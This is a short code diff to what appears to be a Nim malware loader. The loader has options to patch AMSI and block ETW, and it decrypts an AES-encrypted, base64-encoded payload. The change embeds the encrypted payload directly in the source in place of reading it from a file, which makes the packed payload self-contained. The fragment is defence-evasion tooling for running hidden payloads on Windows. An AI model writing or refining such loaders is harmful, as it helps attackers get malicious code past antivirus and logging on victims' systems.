@@ -30,7 +30,7 @@ let
     usePatchAmsi = false
     useBlockETW = false
     password: string = "StaticPassword"
-    inFile: string = "BASE64EncodedFile"
+    binary: string = "BASE64EncodedFile"
 
 when defined amd64:
     echo "[*] Running in x64 process"
@@ -93,7 +93,7 @@ when isMainModule:
         echo fmt"[*] ETW blocked: {bool(blockETWSuccess)}"
 
 var
-    inFileContents: string = readFile(inFile)
+    inFileContents: string = binary
     encrypted: seq[byte] = toByteSeq(decode(inFileContents))
     dctx: CTR[aes256]
     key: array[aes256.sizeKey, byte]
